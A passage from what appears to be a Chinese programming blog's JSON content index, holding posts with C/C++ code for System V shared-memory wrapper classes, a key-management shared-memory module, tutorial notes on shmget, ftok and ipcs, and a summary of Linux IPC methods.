&lt;&lt; &quot;----------------&quot; &lt;&lt; endl; SecKeyShm shm1(0x1234); memset(&amp;info, 0x00, sizeof(NodeSHMInfo)); shm1.shmRead(clientID, serverID, &amp;info); cout &lt;&lt; &quot;status:&quot; &lt;&lt; info.status &lt;&lt; endl; cout &lt;&lt; &quot;seckeyID:&quot; &lt;&lt; info.seckeyID &lt;&lt; endl; cout &lt;&lt; &quot;clientID:&quot; &lt;&lt; info.clientID &lt;&lt; endl; cout &lt;&lt; &quot;serverID:&quot; &lt;&lt; info.serverID &lt;&lt; endl; cout &lt;&lt; &quot;seckey:&quot; &lt;&lt; info.seckey &lt;&lt; endl; shm1.printShm(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"共享内存业务类代码编写","slug":"共享内存业务类代码编写","date":"2022-05-30T16:21:24.000Z","updated":"2022-05-30T16:22:55.356Z","comments":true,"path":"2022/05/31/共享内存业务类代码编写/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/31/共享内存业务类代码编写/","excerpt":"","text":"SecKeyShm.h 123456789101112131415161718192021222324252627282930#pragma once#include &quot;ShareMemory.h&quot;class NodeSHMInfo&#123;public: int status; int seckeyID; char clientID[12]; char serverID[12]; char seckey[128];&#125;;class SecKeyShm : public ShareMemory&#123;public: SecKeyShm(int key); SecKeyShm(int key, int maxNode); SecKeyShm(const char* pathName); SecKeyShm(const char* pathName, int maxNode); ~SecKeyShm(); int shmWrite(NodeSHMInfo* pNodeInfo); int shmRead(const char* clientID, const char* serverID, NodeSHMInfo* pNodeInfo); //for test void printShm();private: int m_maxNode;&#125;; SecKeyShm.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;iostream&gt;#include &quot;SecKeyShm.h&quot;using namespace std;SecKeyShm::SecKeyShm(int key):ShareMemory(key)&#123; &#125;SecKeyShm::SecKeyShm(int key, int maxNode): ShareMemory(key, sizeof(int) + maxNode*sizeof(NodeSHMInfo)), m_maxNode(maxNode)&#123; //连接共享内存 void *p = mapShm(); //初始化共享内存 memset(p, 0x00, sizeof(int) + maxNode*sizeof(NodeSHMInfo)); //将maxNode写入共享内存的头4个字节 memcpy(p, &amp;m_maxNode, sizeof(int)); //断开与共享内存的连接 unmapShm();&#125;SecKeyShm::SecKeyShm(const char* pathName): ShareMemory(pathName)&#123; &#125;SecKeyShm::SecKeyShm(const char* pathName, int maxNode): ShareMemory(pathName, sizeof(int) + maxNode*sizeof(NodeSHMInfo)), m_maxNode(maxNode)&#123; //连接共享内存 void *p = mapShm(); //初始化共享内存 memset(p, 0x00, sizeof(int) + maxNode*sizeof(NodeSHMInfo)); //将maxNode写入共享内存的头4个字节 memcpy(p, &amp;m_maxNode, sizeof(int)); //断开与共享内存的连接 unmapShm();&#125;SecKeyShm::~SecKeyShm()&#123; &#125;int SecKeyShm::shmWrite(NodeSHMInfo* pNodeInfo)&#123; //连接共享内存 void *p = mapShm(); //从头4个字节获取maxNode memcpy(&amp;m_maxNode, p, sizeof(int)); cout &lt;&lt; &quot;maxNode:&quot; &lt;&lt; m_maxNode &lt;&lt; endl; NodeSHMInfo *pNode = (NodeSHMInfo *)((char *)p+sizeof(int)); //先查找原有的 int i = 0; for(i=0; i&lt;m_maxNode; i++) &#123; if(strcmp(pNodeInfo-&gt;clientID, pNode[i].clientID)==0 &amp;&amp; strcmp(pNodeInfo-&gt;serverID, pNode[i].serverID)==0) &#123; memcpy(&amp;pNode[i], pNodeInfo, sizeof(NodeSHMInfo)); break; &#125; &#125; //没找到原有的, 找一个空闲可用的 NodeSHMInfo tmp; memset(&amp;tmp, 0x00, sizeof(NodeSHMInfo)); if(i==m_maxNode) &#123; for(i=0; i&lt;m_maxNode; i++) if(memcmp(&amp;pNode[i], &amp;tmp, sizeof(NodeSHMInfo))==0) &#123; memcpy(&amp;pNode[i], pNodeInfo, sizeof(NodeSHMInfo)); break; &#125; &#125; //断开与共享内存的关联 unmapShm(); //没有空闲位置可用 if(i==m_maxNode) &#123; cout &lt;&lt; &quot;no space to use&quot; &lt;&lt; endl; return -1; &#125; return 0;&#125;int SecKeyShm::shmRead(const char* clientID, const char* serverID, NodeSHMInfo* pNodeInfo)&#123; //连接共享内存 void *p = mapShm(); //从头4个字节获取maxNode memcpy(&amp;m_maxNode, p, sizeof(int)); cout &lt;&lt; &quot;maxNode:&quot; &lt;&lt; m_maxNode &lt;&lt; endl; NodeSHMInfo *pNode = (NodeSHMInfo *)((char *)p+sizeof(int)); int i = 0; for(i=0; i&lt;m_maxNode; i++) &#123; if(strcmp(clientID, pNode[i].clientID)==0 &amp;&amp; strcmp(serverID, pNode[i].serverID)==0) &#123; memcpy(pNodeInfo, &amp;pNode[i], sizeof(NodeSHMInfo)); break; &#125; &#125; //断开与共享内存的关联 unmapShm(); //没有找到节点 if(i==m_maxNode) &#123; cout &lt;&lt; &quot;not found&quot; &lt;&lt; endl; return -1; &#125; return 0;&#125;void SecKeyShm::printShm()&#123; //连接共享内存 void *p = mapShm(); //从头4个字节获取maxNode memcpy(&amp;m_maxNode, p, sizeof(int)); cout &lt;&lt; &quot;maxNode:&quot; &lt;&lt; m_maxNode &lt;&lt; endl; NodeSHMInfo *pNode = (NodeSHMInfo *)((char *)p+sizeof(int)); int i = 0; for(i=0; i&lt;m_maxNode; i++) &#123; cout &lt;&lt; &quot;-------&quot; &lt;&lt; i &lt;&lt; &quot;-------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;status:&quot; &lt;&lt; pNode[i].status &lt;&lt; endl; cout &lt;&lt; &quot;seckeyID:&quot; &lt;&lt; pNode[i].seckeyID &lt;&lt; endl; cout &lt;&lt; &quot;clientID:&quot; &lt;&lt; pNode[i].clientID &lt;&lt; endl; cout &lt;&lt; &quot;serverID:&quot; &lt;&lt; pNode[i].serverID &lt;&lt; endl; cout &lt;&lt; &quot;seckey:&quot; &lt;&lt; pNode[i].seckey &lt;&lt; endl; &#125; return;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"共享内存基础类的代码编写","slug":"共享内存基础类的代码编写","date":"2022-05-30T15:22:19.000Z","updated":"2022-05-30T16:20:02.955Z","comments":true,"path":"2022/05/30/共享内存基础类的代码编写/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/30/共享内存基础类的代码编写/","excerpt":"","text":"ShareMemory.h 123456789101112131415161718192021222324252627#pragma once#include &lt;sys/ipc.h&gt;#include &lt;sys/shm.h&gt;#include &lt;stdlib.h&gt;const char RandX = 'x';class ShareMemory&#123;public: ShareMemory(int key); ShareMemory(int key, int size); ShareMemory(const char* name); ShareMemory(const char* name, int size); virtual ~ShareMemory(); void* mapShm(); int unmapShm(); int delShm();private: int getShmID(key_t key, int shmSize, int flag);private: int m_shmID; void* m_shmAddr = NULL;&#125;; ShareMemory.cpp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;sys/ipc.h&gt;#include &lt;sys/shm.h&gt;#include \"ShareMemory.h\"ShareMemory::ShareMemory(int key)&#123; m_shmID = getShmID(key, 0, 0);&#125;ShareMemory::ShareMemory(int key, int size)&#123; m_shmID = getShmID(key, size, IPC_CREAT | 0755);&#125;ShareMemory::ShareMemory(const char* name)&#123; key_t key = ftok(name, RandX); m_shmID = getShmID(key, 0, 0);&#125;ShareMemory::ShareMemory(const char* name, int size)&#123; key_t key = ftok(name, RandX); m_shmID = getShmID(key, size, IPC_CREAT | 0755);&#125;int ShareMemory::getShmID(key_t key, int shmSize, int flag)&#123; m_shmID = shmget(key, shmSize, flag); if(m_shmID&lt;0) &#123; //打印日志 return -1; &#125; return m_shmID;&#125;ShareMemory::~ShareMemory()&#123; &#125;void *ShareMemory::mapShm()&#123; m_shmAddr = shmat(m_shmID, NULL, 0); if(m_shmAddr==(void *)-1) &#123; //日志 return NULL; &#125; return m_shmAddr;&#125;int ShareMemory::unmapShm()&#123; int ret = shmdt(m_shmAddr); return ret;&#125;int ShareMemory::delShm()&#123; int ret = shmctl(m_shmID, IPC_RMID, NULL); return ret;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"共享内存","slug":"共享内存","date":"2022-05-24T00:16:14.000Z","updated":"2022-05-24T01:13:51.758Z","comments":true,"path":"2022/05/24/共享内存/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/24/共享内存/","excerpt":"","text":"共享内存 共享内存是进程间通信中最简单的方式之一。共享内存允许两个或更多进程访问同一块内存，当一个进程改 变了这块地址中的内容的时候，其它进程都会察觉到这个更改。 共享内存头文件 12#include &lt;sys/ipc.h&gt;#include &lt;sys/shm.h&gt; 共享内存操作函数 创建或打开一块共享内存区 1234567891011121314151617181920212223int shmget(key_t key, size_t size, int shmflg);- 参数key: 创建出的共享内存的键值, 每块共享内存的键值是唯一的 - 看做一个32位整形数, 一般指定的数据格式是16进制形式的- 参数size: 创建的共享内存的大小, 分配的时候实际大小是是4k的倍数- 参数shmflag: 共享内存的属性, 与创建文件相同 - open(name, flag, mode); - 与flag相同 - shmflag的取值 - IPC_CREAT: 创建共享内存 - 创建文件并指定权限: IPC_CREAT|0664 - IPC_EXCL: 必须和IPC_CREAT一起使用, 检测共享内存是否存在 - 返回值: 返回创建的共享内存的描述符, 理解为共享内存的ID, ID也是唯一的 成功: 返回共享内存的ID值 失败: 返回-1, 并设置errno // 1. 创建一块不存在的共享内存 // 如果检测到key值为0x12的共享内存已经存在, 该函数调用失败 shmget(0x12, 4096, IPC_CREAT|IPC_EXCL|0664) // 2. 打开一块已经存在的共享内存, 共享内存的key 0x12 shmget(0x12, 0, 0) // 3. 操作一块内存, 存在打开, 不存在创建 shmget(0x12, 4096, IPC_CREAT|0664) 将当前进程和共享内存关联到一起 12345678910void *shmat(int shmid, const void *shmaddr, int shmflg);- 参数shmid: shmget函数的返回值 - 参数shmaddr: 共享内存和进程关联, 指定的内存位置 - 赋值为NULL, 内核会自动分配 - 参数shmflg: - SHM_RDONLY: 对共享内存只读 - 0: 可以对共享内存读写 - 返回值: 关联成功之后, 内核分配的可进行读写的内存块的首地址 成功: 内存地址 失败: (void *) -1 将共享内存和当前进程分离 12345int shmdt(const void *shmaddr); - 参数shmaddr: shmat函数的返回值 - 返回值: 成功: 返回0 失败: 返回-1, 并设置errno 共享内存操作 -（删除共享内存 ） 12345678910int shmctl(int shmid, int cmd, struct shmid_ds *buf); - 参数shmid: shmget函数的返回值 - 参数cmd: - IPC_STAT: 查看共享内存状态 - IPC_SET: 设置共享内存状态 - IPC_RMID: 删除共享内存 - 参数buf: - IPC_STAT: 传出参数, 记录共享内存信息 - IPC_SET: 传入参数 - IPC_RMID: 用不到, 赋值为NULL 问题1: 是不是可以对共享内存进行多次删除 可以 共享内存被删除一次之后, 如果还有进程和共享内存关联着, 共享内存的key会发生变化变成0 如果共享内存key是&gt;0的数: 共享内存状态正常, 任意进程都可以和当前共享内存进行关联 key == 0: 共享内存标记为被删除, 没有被马上删除是因为还有进程没有和它解除关联 不相干的进程是没有权限和key为0的共享内存进行关联的 问题2: 如果多个进程都和同一共享内存进行关联, 其中一个进程将共享内存删除, 共享内存什么时候被删除? 共享内存的引用计数为0 的时候, 共享内存被删除 shm和mmap的区别 shm不需要磁盘文件, mmap需要磁盘文件 shm效率高 mmap操作的数据量比shm大 4. shm内存位置在内核只有一块, mmap内存在用户区, 每个进程都有各自的内存映射区 shm和mmap的数据谁更安全? mmap会通过映射的文件做备份 进程退出, 共享内存依然存在, 进程退出,内存映射区就不存在了 ftok函数 函数原型 1234567key_t ftok(const char *pathname, int proj_id); - pathname: 路径或文件名, 必须存在, 对文件的权限没有要求 - /home/kevin/a.txt - /home/kevin/hello - 目录 - proj_id: 只用到了一个字节, 取值范围: 0-255, 也可以传递一字符 - 88 - &apos;a 思考: pathname 是目录还是文件的具体路径，是否可以随便设置？ 可以 pathname 指定的目录或文件的权限是否有要求? 没有 proj_id 是否可以随便设定，有什么限制条件? 取值范围 0-255 陷阱： 误解: 只要文件的路径，名称和子序列号不变，那么得到的key值永远就不会变。 正解: 如果pathname指向的文件或者目录被删除而且又重新创建，那么文件系统会赋予这个同名文件新 的inode 节点信息，于是这些进程调用的 ftok() 都能正常返回，但键值key却不一定相同了。 共享内存操作命令 ipcs 用法 12345ipcs -a // 打印当前系统中所有的进程间通信方式的信息 ipcs -m // 打印出使用共享内存进行进程间通信的信息 == 常用 =============== 以下为了解内容 ================ ipcs -q // 打印出使用消息队列进行进程间通信的信息 ipcs -s // 打印出使用信号进行进程间通信的信息 man msgget //消息队列相关函数 man semget //信号量数组相关函数 ipcrm 用法 1234567ipcrm -M shmkey // 移除用shmkey创建的共享内存段 ipcrm -m shmid // 移除用shmid标识的共享内存段================ 以下为了解内容 ================ ipcrm -Q msgkey // 移除用msqkey创建的消息队列 ipcrm -q msqid // 移除用msqid标识的消息队列 ipcrm -S semkey // 移除用semkey创建的信号 ipcrm -s semid // 移除用semid标识的信号 共享内存在项目中的使用 与业务相关的共享内存结构图: 12345678struct NodeSHMInfo &#123; int status; //密匙状态int seckeyID; char clientID[12]; char serverID[12];char seckey[128]; //密匙&#125; NODE; 共享内存结构图: 头4个字节存放最大节点个数, 后面一共存放maxNode个秘钥信息 在遍历共享内存的时候, 首先获得共享内存的头4个字节内容, 也就是最大节点个数, 可以作为遍历的最大次数. 遍历的时候查找共享内存根据clientID和serverID来进行查找. myipc_shm.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// myipc_shm.h#ifndef _WBM_MY_SHM_H_#define _WBM_MY_SHM_H_#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#ifdef __cplusplus extern &quot;C&quot; &#123;#endif//共享内存错误码#define MYIPC_OK 0 //正确#define MYIPC_ParamErr 301 //输入参数失败#define MYIPC_NotEXISTErr 302 //共享内存不存在错误#define MYIPC_CreateErr 303 //创建共享内存错误//创建共享内存 若共享内存不存在，则创建int IPC_CreatShm(int key, int shmsize, int *shmhdl);//打开共享内存 若共享内存不存在，返回错误int IPC_OpenShm(int key, int shmsize, int *shmhdl);/*********************************************************************** 功能描述： 创建共享内存 通过种子文件 参数说明： shmname [in] 是共享内存名,系统中唯一标志 shmsize [in] 是要创建的共享内存的大小； shmhdl [out] 共享内存的句柄. 返回值： 返回0函数执行成功；非0返回错误码************************************************************************/int IPC_CreatShmBySeedName(char *shmname, int shmsize, int *shmhdl);/*********************************************************************** 功能描述： 关联共享内存 参数说明： shmhdl [in] 共享的句柄 mapaddr [out] 共享内存首地址 返回值： 返回0函数执行成功；非0返回错误码************************************************************************/int IPC_MapShm(int shmhdl, void **mapaddr);/*********************************************************************** 功能描述： 取消共享内存关联 参数说明： unmapaddr [in] 共享内存首地址 返回值： 返回0函数执行成功；非0返回错误码************************************************************************/int IPC_UnMapShm(void *unmapaddr);/*********************************************************************** 功能描述： 删除共享内存 参数说明： shmhdl [in] 共享的句柄 返回值： 返回0函数执行成功；非0返回错误码************************************************************************/int IPC_DelShm(int shmhdl);#ifdef __cplusplus&#125;#endif#endif myipc_shm.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133#define _OS_LINUX_#if defined _OS_LINUX_#include &lt;stdio.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;memory.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/shm.h&gt;#include &lt;sys/sem.h&gt;#include &lt;sys/msg.h&gt;#include &quot;myipc_shm.h&quot; #endifstatic int shmflag = 0;static int shmkey;//创建共享内存 若共享内存不存在，则创建 若存在使用原来的int IPC_CreatShm(int key, int shmsize, int *shmhdl)&#123; int tmpshmhdl = 0; int ret = 0; // 创建共享内存 // 若共享内存不存在则创建 // 若共享内存已存在使用原来的 tmpshmhdl = shmget(key, shmsize, IPC_CREAT | IPC_EXCL | 0666); if (tmpshmhdl == -1) //创建失败 &#123; ret = MYIPC_ParamErr; printf(&quot;func shmget() err :%d &quot;, ret); return ret; &#125; *shmhdl = tmpshmhdl; return ret;&#125;//打开共享内存 若共享内存不存在，返回错误//参数 无意义 可填写0int IPC_OpenShm(int key, int shmsize, int *shmhdl)&#123; int tmpshmhdl = 0; int ret = 0; // 创建共享内存 // 若共享内存不存在则创建 // 若共享内存已存在使用原来的 tmpshmhdl = shmget(key, 0, 0); if (tmpshmhdl == -1) //打开失败 &#123; ret = MYIPC_NotEXISTErr; //printf(&quot;func shmget() err :%d &quot;, ret); return ret; &#125; *shmhdl = tmpshmhdl; return ret;&#125;/*********************************************************************** 功能描述： 创建共享内存 参数说明： shmname [in] 是共享内存名,系统中唯一标志 shmsize [in] 是要创建的共享内存的大小； shmhdl [out] 共享内存的句柄. 返回值： 返回0函数执行成功；非0返回错误码************************************************************************/int IPC_CreatShmBySeedName(char *shmseedfile, int shmsize, int *shmhdl)&#123; if (shmflag == 0) //判断接口中共享内存key是否已经存在 &#123; shmkey = ftok(shmseedfile, &apos;c&apos;); if (shmkey == -1) &#123; perror(&quot;ftok&quot;); return -1; &#125; shmflag = 1; &#125; //创建共享内存 *shmhdl = shmget(shmkey, shmsize, IPC_CREAT | 0666); if (*shmhdl == -1) //创建失败 return -2; return 0;&#125;/*********************************************************************** 功能描述： 关联共享内存 参数说明： shmhdl [in] 共享的句柄 mapaddr [out] 共享内存首地址 返回值： 返回0函数执行成功；非0返回错误码************************************************************************/int IPC_MapShm(int shmhdl, void **mapaddr)&#123; void *tempptr = NULL; //连接共享内存 tempptr = (void *)shmat(shmhdl, 0, 0); if (tempptr == (void*)-1) //共享内存连接失败 return -1; *mapaddr = tempptr; //导出共享内存首指针 return 0;&#125;/*********************************************************************** 功能描述： 取消共享内存关联 参数说明： unmapaddr [in] 共享内存首地址 返回值： 返回0函数执行成功；非0返回错误码************************************************************************/int IPC_UnMapShm(void *unmapaddr)&#123; int rv; //取消连接共享内存 rv = shmdt((char *)unmapaddr); if (rv == -1) //取消连接失败 return -1; return 0;&#125;/*********************************************************************** 功能描述： 删除共享内存 参数说明： shmhdl [in] 共享的句柄 返回值： 返回0函数执行成功；非0返回错误码************************************************************************/int IPC_DelShm(int shmhdl)&#123; int rv; //删除共享内存 rv = shmctl(shmhdl, IPC_RMID, NULL); if (rv &lt; 0) //删除共享内存失败 return -1; return 0;&#125; keymng_shmop.h 12345678910111213141516171819202122232425262728293031323334353637// keymng_shmop.h#ifndef _KEYMNG_SHMOP_H_#define _KEYMNG_SHMOP_H_#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#ifdef __cplusplus extern &quot;C&quot; &#123;#endif//将网点密钥信息写共享内存， 网点共享内存结构体typedef struct _NodeSHMInfo&#123; int status; //密钥状态 0-有效 1无效 char clientId[12]; //客户端id char serverId[12]; //服务器端id int seckeyid; //对称密钥id unsigned char seckey[128]; //对称密钥 //hash1 hash256 md5&#125;NodeSHMInfo;//int KeyMng_ShmInit(int keyid, int keysize, void *shmid )//打开共享内存 共享内存存在则使用 不存在则创建int KeyMng_ShmInit(int key, int maxnodenum, int *shmhdl);// 客户端已经存储了一个秘钥 - 覆盖// ......还没有存储秘钥 - 找一个位置存储秘钥int KeyMng_ShmWrite(int shmhdl, int maxnodenum, NodeSHMInfo *pNodeInfo);int KeyMng_ShmRead(int shmhdl, char *clientId, char *serverId, int maxnodenum, NodeSHMInfo *pNodeInfo);#ifdef __cplusplus&#125;#endif#endif keymng_shmop.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;//#include &lt;sys/socket.h&gt;//#include &lt;netinet/in.h&gt;//#include &lt;arpa/inet.h&gt;#include &lt;signal.h&gt;#include &lt;sys/wait.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;errno.h&gt;#include &lt;string.h&gt;#include &quot;itcastlog.h&quot;#include &quot;keymng_shmop.h&quot;#include &quot;myipc_shm.h&quot;//#include &quot;keymngclientop.h&quot;//#include &quot;poolsocket.h&quot;//看共享内存是否存在//若 存在使用旧 //若 不存在创建int KeyMng_ShmInit(int key, int maxnodenum, int *shmhdl)&#123; int ret = 0; //打开共享内存 ret = IPC_OpenShm(key, maxnodenum * sizeof(NodeSHMInfo), shmhdl); if (ret == MYIPC_NotEXISTErr) &#123; printf(&quot;keymng监测到共享内存不存在 正在创建共享内存...\\n&quot;); ret = IPC_CreatShm(key, maxnodenum * sizeof(NodeSHMInfo), shmhdl); if (ret != 0) &#123; printf(&quot;keymng创建共享内存 err:%d \\n&quot;, ret); return ret; &#125; else &#123; void *mapaddr = NULL; printf(&quot;keymng创建共享内存 ok...\\n&quot;); ret = IPC_MapShm(*shmhdl, (void **)&amp;mapaddr); if (ret != 0) &#123; printf(&quot;fun IPC_MapShm() err:%d 清空共享内存失败\\n&quot;, ret); return ret; &#125; memset(mapaddr, 0, maxnodenum * sizeof(NodeSHMInfo)); IPC_UnMapShm(mapaddr); printf(&quot;keymng清空共享内存ok\\n&quot;); &#125; &#125; else if (ret == 0) &#123; printf(&quot;keymng监测到共享内存存在 使用旧的共享内存...\\n&quot;); &#125; else &#123; printf(&quot;fun IPC_OpenShm() err:%d\\n&quot;, ret); &#125; return ret;&#125;//写网点密钥 //若存在 则修改 //若不存在 则找一个空的位置写入int KeyMng_ShmWrite(int shmhdl, int maxnodenum, NodeSHMInfo *pNodeInfo)&#123; int ret = 0, i = 0; NodeSHMInfo tmpNodeInfo; //空结点 NodeSHMInfo *pNode = NULL; bool flag = false; void *mapaddr = NULL; memset(&amp;tmpNodeInfo, 0, sizeof(NodeSHMInfo)); //连接共享内存 ret = IPC_MapShm(shmhdl, (void **)&amp;mapaddr); if (ret != 0) &#123; flag = true; ITCAST_LOG(__FILE__, __LINE__, IC_ERROR_LEVEL, ret, &quot;func IPC_MapShm() err&quot;); goto End; &#125; if(flag) break; //判断传入的网点密钥 是否已经 存在 for (i = 0; i &lt; maxnodenum; i++) &#123; pNode = mapaddr + sizeof(NodeSHMInfo)*i; if (strcmp(pNode-&gt;clientId, pNodeInfo-&gt;clientId) == 0 &amp;&amp; strcmp(pNode-&gt;serverId, pNodeInfo-&gt;serverId) == 0) &#123; ITCAST_LOG(__FILE__, __LINE__, IC_WARNING_LEVEL, ret, &quot;系统检测到 共享内存中已经存在网点信息cliented:%s serverid%s&quot;, pNode-&gt;clientId, pNode-&gt;serverId); memcpy(pNode, pNodeInfo, sizeof(NodeSHMInfo)); goto End; &#125; &#125; //若不存在 for (i = 0; i &lt; maxnodenum; i++) &#123; pNode = mapaddr + sizeof(NodeSHMInfo)*i; if (memcmp(&amp;tmpNodeInfo, pNode, sizeof(NodeSHMInfo)) == 0) &#123; ITCAST_LOG(__FILE__, __LINE__, IC_WARNING_LEVEL, ret, &quot;系统检测到 有一个空的位置 &quot;); memcpy(pNode, pNodeInfo, sizeof(NodeSHMInfo)); goto End; &#125; &#125; if (i == maxnodenum) &#123; ret = 1111; ITCAST_LOG(__FILE__, __LINE__, IC_ERROR_LEVEL, ret, &quot;系统检测到共享内存已满 &quot;); goto End; &#125;End: IPC_UnMapShm(mapaddr); return ret;&#125;//根据clientid和serverid 去读网点信息int KeyMng_ShmRead(int shmhdl, char *clientId, char *serverId, int maxnodenum, NodeSHMInfo *pNodeInfo)&#123; int ret = 0, i = 0; NodeSHMInfo tmpNodeInfo; //空结点 NodeSHMInfo *pNode = NULL; void *mapaddr = NULL; memset(&amp;tmpNodeInfo, 0, sizeof(NodeSHMInfo)); //连接共享内存 ret = IPC_MapShm(shmhdl, (void **)&amp;mapaddr); if (ret != 0) &#123; ITCAST_LOG(__FILE__, __LINE__, IC_ERROR_LEVEL, ret, &quot;func IPC_MapShm() err&quot;); goto End; &#125; //遍历网点信息 for (i = 0; i &lt; maxnodenum; i++) &#123; pNode = mapaddr + sizeof(NodeSHMInfo)*i; if (strcmp(pNode-&gt;clientId, clientId) == 0 &amp;&amp; strcmp(pNode-&gt;serverId, serverId) == 0) &#123; ITCAST_LOG(__FILE__, __LINE__, IC_WARNING_LEVEL, ret, &quot;系统检测到 有一个空的位置 &quot;); memcpy(pNodeInfo, pNode, sizeof(NodeSHMInfo)); goto End; &#125; &#125; if (i == maxnodenum) &#123; ret = 1111; ITCAST_LOG(__FILE__, __LINE__, IC_WARNING_LEVEL, ret, &quot;系统检测到共享内存已满 &quot;); goto End; &#125;End: IPC_UnMapShm(mapaddr); return ret;&#125; 进程间通讯的几种方式: 1 匿名管道pipe: 特点: 1 只能用于有血缘关系的进程间通信 2 管道有两端, 管道的数据流向是从管道的写端到管道的读端 3 管道的本质是一块内核缓冲区 4 数据从管道中读走之后就不存在了 5 管道的实现实际上是环形队列 6 默认情况下管道的读端和写端都是阻塞的 2 命名管道: fifo 特点: 1 有无血缘关系的进程间通信都可以 2 创建的fifo文件大小为0, 是linux文件类型之一 3 使用fifo需要先创建一个fifo文件 4 使用fifo完成通信两个进程必须打开相同的fifo文件 5 效率比pipe低 3 mmap ​ 共享映射区本质是将文件内容映射到内存. 特点: ​ 1 有无血缘关系都可以完成进程间通信 ​ 2 如果完成没有血缘关系的进程间通信必须使用文件. ​ 3 若使用的是MAP_SHARED, 则对内存的修改会反映到文件中去 ​ 4 需要注意mmap可能存在调用失败的情况 ​ 5 匿名映射只能用于有血缘关系的进程间通信 4 信号 ​ 进程A给进程B发送信号的实现机制: 本质上是进程A先给内核发送信号, 然后内核给进程B发送 ​ 通signal或者sigaction注册信号 ​ 通过kill函数给指定进程发送信号 特点: ​ 1 信号不能携带大量信息 ​ 2 信号的优先级高, 产生信号之后会打断程序的执行 ​ 3 不建议使用信号完成进程间通信. ​ 4 一般使用kill命令给一个进程发送信号, 进程收到信号之后调用信号处理函数完成操作. 信号的处理动作: ​ 1 忽略信号 ​ 2 执行默认处理动作 ​ 3 执行用户自定义的函数 5 本地socket通信 12unix_socket = socket(AF_UNIX, SOCK_STREAM, 0);unix_socket = socket(AF_UNIX, SOCK_DGRAM, 0); ​ 1 本地socket通信既可以使用TCP也可以使用UDP ​ 2 如果使用TCP通信, bind的时候需要指定一个文件, 若文件存在会保存, unlink删除. ​ 3 读或者写其实是通过文件描述符去操作内核的缓冲区 ​ 4 编写流程, 可以直接参考TCP或者UDP开发流程. 6 共享内存 ​ 共享内存的实质是将内核的一块内存映射到进程中的内存, 操作本地内存就相当于操作共享内存. 使用共享内存的步骤: ​ 1 创建共享内存 ​ 2 关联共享内存 ​ 3 使用共享内存–读写共享内存 ​ 4 断开与共享内存的关联 ​ 5 删除共享内存 共享内存和以上的管道, mmap和本地socket通信比较起来, 共享内存不需要文件描述符, 后者需要. 共享内存是进程间通信方式中效率最高的.","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"socket类","slug":"socket类","date":"2022-05-24T00:11:22.000Z","updated":"2022-05-24T00:14:41.817Z","comments":true,"path":"2022/05/24/socket类/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/24/socket类/","excerpt":"","text":"TcpSocket.h 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#pragma once#include &quot;ItcastLog.h&quot;/* 用于通信的套接字类 */// 超时的时间static const int TIMEOUT = 1000;class TcpSocket&#123;public: enum ErrorType &#123;ParamError = 3001, TimeoutError, PeerCloseError, MallocError&#125;; TcpSocket(); // 使用一个可以用于通信的套接字实例化套接字对象 TcpSocket(int connfd); ~TcpSocket(); // 连接服务器 int connectToHost(char* ip, unsigned short port, int timeout = TIMEOUT); // 发送数据 int sendMsg(char* sendData, int dataLen, int timeout = TIMEOUT); // 接收数据 int recvMsg(char** recvData, int &amp;recvLen, int timeout = TIMEOUT); // 断开连接 void disConnect(); // 释放内存 void freeMemory(char** buf);private: // 设置I/O为非阻塞模式 int blockIO(int fd); // 设置I/O为阻塞模式 int noBlockIO(int fd); // 读超时检测函数，不含读操作 int readTimeout(unsigned int wait_seconds); // 写超时检测函数, 不包含写操作 int writeTimeout(unsigned int wait_seconds); // 带连接超时的connect函数 int connectTimeout(struct sockaddr_in *addr, unsigned int wait_seconds); // 每次从缓冲区中读取n个字符 int readn(void *buf, int count); // 每次往缓冲区写入n个字符 int writen(const void *buf, int count);private: int m_socket; // 用于通信的套接字 ItcastLog m_log; // log对象&#125;; TcpSocket.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603